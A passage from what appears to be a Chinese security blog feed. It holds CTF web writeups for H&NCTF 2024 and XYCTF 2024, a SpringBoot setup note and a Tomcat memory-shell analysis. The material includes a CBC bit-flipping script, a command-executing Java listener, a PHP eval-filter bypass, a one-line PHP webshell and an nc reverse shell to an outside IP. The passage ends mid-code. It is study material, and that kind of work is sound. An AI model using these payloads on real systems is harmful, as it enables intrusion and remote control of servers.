class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>考察CBC反转攻击</p><p><a href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a></p><p>贴一个其他师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    1. 分组 16个字节一组</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&quot;admin&quot;: 0, &quot;us</span></span><br><span class="line"><span class="comment"># ername&quot;: &quot;user1&quot;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    2. 获取原始密文</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">ciphertext = <span class="string">&#x27;wv7sRdpuU1HMAgqUWAOjoZuLsH9jUDnCaVtBxN8fQH6zyxmGqarbH7R/cuSUVx1xnKKDoUjIeo1GQwkg39DZ6Q==&#x27;</span></span><br><span class="line">cipher = base64.b64decode(urllib.parse.unquote(ciphertext))</span><br><span class="line">array_cipher = <span class="built_in">bytearray</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    3， 字节翻转</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line">array_cipher[offset] =  array_cipher[offset]^ <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;newCipher:&#x27;</span>,urllib.parse.quote(base64.b64encode(array_cipher)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后就是文件读取+flask pin计算, 偷个懒</p><h2 id="奇怪的网站"><a href="#奇怪的网站" class="headerlink" title="奇怪的网站"></a>奇怪的网站</h2><p>目录扫描可以扫描出来&#x2F;404.php &#x2F;flag.php</p><p>访问网站时有一个302重定向, 这里有提示</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240530001443451.png" alt="image-20240530001443451"></p><p>如果有使用vim的经验的化我们知道vim在异常退出的时候会生成一个隐藏的缓存文件的</p><blockquote><p>第一次产生的缓存文件后缀为.swp，第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn, 第四次产生的缓存文件后缀为.swm</p></blockquote><h2 id="GPTS"><a href="#GPTS" class="headerlink" title="GPTS"></a>GPTS</h2><p><a href="https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2+kdurD&alichlgref=https://www.bing.com/">https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2%2BkdurD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</a></p><h2 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;H-NCTF-2024-WEB-复现&quot;&gt;&lt;a href=&quot;#H-NCTF-2024-WEB-复现&quot; class=&quot;headerlink&quot; title=&quot;H&amp;amp;NCTF 2024 WEB 复现&quot;&gt;&lt;/a&gt;H&amp;amp;NCTF 2024 WEB 复现&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://example.com/categories/WriteUp/"/>
    
    
    <category term="python内存马" scheme="http://example.com/tags/python%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="CBC翻转攻击" scheme="http://example.com/tags/CBC%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    
    <category term="侧信道" scheme="http://example.com/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/"/>
    
    <category term="Flask Pin码计算" scheme="http://example.com/tags/Flask-Pin%E7%A0%81%E8%AE%A1%E7%AE%97/"/>
    
    <category term="ThinkPHP" scheme="http://example.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot学习</title>
    <link href="http://example.com/2024/05/24/SpringBoot%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/05/24/SpringBoot%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-05-24T11:20:23.000Z</published>
    <updated>2024-05-24T16:13:09.618Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IDEA创建SpringBoot项目"><a href="#IDEA创建SpringBoot项目" class="headerlink" title="IDEA创建SpringBoot项目"></a>IDEA创建SpringBoot项目</h2><p>选择创建Spring Initializr</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524192417970.png" alt="image-20240524192417970"></p><p>勾选Spring web</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524192559708.png" alt="image-20240524192559708"></p><p>此时idea会默认为我们创建一个SpringBoot项目</p><p>由于我们使用是jdk 1.8, 这里会踩坑</p><p>我们需要更改SpringBoot版本为2.x否则会报错</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524193743796.png" alt="image-20240524193743796"></p><p>这里java版本也改成java8</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524193758233.png" alt="image-20240524193758233"></p><p>之后成功运行</p><p>可以看见Tomcat已经启动了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524194045710.png" alt="image-20240524194045710"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;IDEA创建SpringBoot项目&quot;&gt;&lt;a href=&quot;#IDEA创建SpringBoot项目&quot; class=&quot;headerlink&quot; title=&quot;IDEA创建SpringBoot项目&quot;&gt;&lt;/a&gt;IDEA创建SpringBoot项目&lt;/h2&gt;&lt;p&gt;选择创建Sp</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Tomcat内存马分析</title>
    <link href="http://example.com/2024/05/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/05/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/</id>
    <published>2024-05-21T14:54:52.000Z</published>
    <updated>2024-05-22T14:52:15.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat内存马分析"><a href="#Tomcat内存马分析" class="headerlink" title="Tomcat内存马分析"></a>Tomcat内存马分析</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><p><a href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p><p><a href="https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90">https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90</a></p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>紧接着上一篇Java Web基础篇, 在这里细说Tomcat内存马</p><p>在之前的学习中, 我们已经搭建了tomcat和jsp的调试环境</p><p>参考</p><p><a href="https://zhuanlan.zhihu.com/p/35454131">https://zhuanlan.zhihu.com/p/35454131</a></p><h3 id="三大组件"><a href="#三大组件" class="headerlink" title="三大组件"></a>三大组件</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><blockquote><p>Servlet是用来处理客户端请求的动态资源，当Tomcat接收到来自客户端的请求时，会将其解析成<code>RequestServlet</code>对象并发送到对应的Servlet上进行处理。</p></blockquote><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><blockquote><p>Filter用于拦截用户请求以及服务端的响应，能够在拦截之后对请求和响应做出相应的修改。Filter不是Servlet，不能直接访问，它能够对于Web应用中的资源（Servlet、JSP、静态页面等）做出拦截，从而实现一些相应的功能。下面是Filter在Server中的调用流程图</p></blockquote><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><blockquote><p>Listener是一个实现了特定接口的Java程序，用于监听一个方法或者属性，当被监听的方法被调用或者属性改变时，就会自动执行某个方法。</p></blockquote><p>三大组件加载顺序</p><ol><li><strong>Listener</strong></li><li><strong>Filter</strong></li><li><strong>Servlet</strong></li></ol><h3 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h3><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1-795x1500.jpg"></p><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><blockquote><p>在Tomcat中的servlet都基本上需要实现这个接口，规定了如果要实现一个WEB容器，他的内容就必须要包含Servletcontext里的内容</p></blockquote><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><blockquote><p>在Tomcat中，ServletContext的实现就是ApplicationContext<br><strong>其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等</strong></p></blockquote><h4 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h4><blockquote><p>StandardContext是Tomcat中真正起作用的Context，负责跟Tomcat的底层交互，ApplicationContext其实更像对StandardContext的一种封装。</p></blockquote><h2 id="Listener型内存马"><a href="#Listener型内存马" class="headerlink" title="Listener型内存马"></a>Listener型内存马</h2><p>我们知道最先接收到请求的就是listener组件, 因此我们完全可以在服务器中动态注册一个恶意的listener</p><p>而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>对于ServletRequestListener, 我们访问任意服务器资源是都会触发, 因此用来作内存马再适合不过了</p><p>当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。下面我们来实现一个恶意的Listener</p><p>我们直接在这里创建一个listener</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240522000146182.png" alt="image-20240522000146182"></p><p>idea会自动为我们生成基本的框架, 需要重写的方法等</p><p>我们将其修改为恶意的listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;shell_cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时访问任意的路由即可触发任意命令执行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240522001621396.png" alt="image-20240522001621396"></p><p>下面的问题就是如何将恶意的Listener动态注册进服务器了，下面我们来分析一下Listener的创建过程。</p><h3 id="Listener的创建过程"><a href="#Listener的创建过程" class="headerlink" title="Listener的创建过程"></a>Listener的创建过程</h3><p>首先贴出listener的调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">requestInitialized:<span class="number">13</span>, Shell_Listener (Listener)</span><br><span class="line">fireRequestInitEvent:<span class="number">5992</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">121</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">357</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">382</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tomcat内存马分析&quot;&gt;&lt;a href=&quot;#Tomcat内存马分析&quot; class=&quot;headerlink&quot; title=&quot;Tomcat内存马分析&quot;&gt;&lt;/a&gt;Tomcat内存马分析&lt;/h1&gt;&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF 2024 Web</title>
    <link href="http://example.com/2024/04/28/XYCTF-2024-Web/"/>
    <id>http://example.com/2024/04/28/XYCTF-2024-Web/</id>
    <published>2024-04-28T06:51:55.000Z</published>
    <updated>2024-04-28T06:53:23.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XYCTF-2024-Web"><a href="#XYCTF-2024-Web" class="headerlink" title="XYCTF 2024 Web"></a>XYCTF 2024 Web</h1><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h2><p>略</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>略</p><h2 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h2><p>相同md5图片, 一搜就有, 略</p><h2 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先要添加一个<code>%0a</code>让代码不被#注释, 然后用<code>%23</code>再把,manba out注释掉</p><p>$(which sh)代替bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0a`$_GET[1]`;%23</span><br><span class="line">&amp;1=nc 107.148.75.202 1234 -e $(which sh)</span><br></pre></td></tr></table></figure><h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a><strong>ezMake</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php if(eval($$_POST[1])) ?&gt;&#x27; &gt; a.php</span><br></pre></td></tr></table></figure><h2 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a><strong>ez?Make</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 107.148.75.202 1234  -e `which sh`</span><br></pre></td></tr></table></figure><h2 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 